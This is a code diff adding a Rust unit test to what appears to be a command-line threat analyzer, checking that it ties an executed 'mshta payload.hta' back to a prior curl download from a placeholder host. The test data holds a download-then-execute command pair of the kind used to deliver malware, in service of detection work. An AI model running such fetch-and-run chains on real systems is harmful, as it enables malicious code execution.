@@ -8752,6 +8752,29 @@ mshta payload.hta"#,
     }
 
     #[test]
+    fn mshta_basename_hta_resolves_full_path_download_source() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl -o C:\Temp\payload.hta https://mshta-basename.example/payload.hta"#,
+            &mut env,
+        );
+        interpret_line("mshta payload.hta", &mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "mshta payload.hta"
+                        && url == "https://mshta-basename.example/payload.hta"
+            )
+        });
+        assert!(
+            has,
+            "mshta basename HTA did not resolve full-path download source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn rundll32_records_cmd() {
         let mut env = Environment::new(&Config::default());
         interpret_line("rundll32 some.dll,EntryPoint", &mut env);
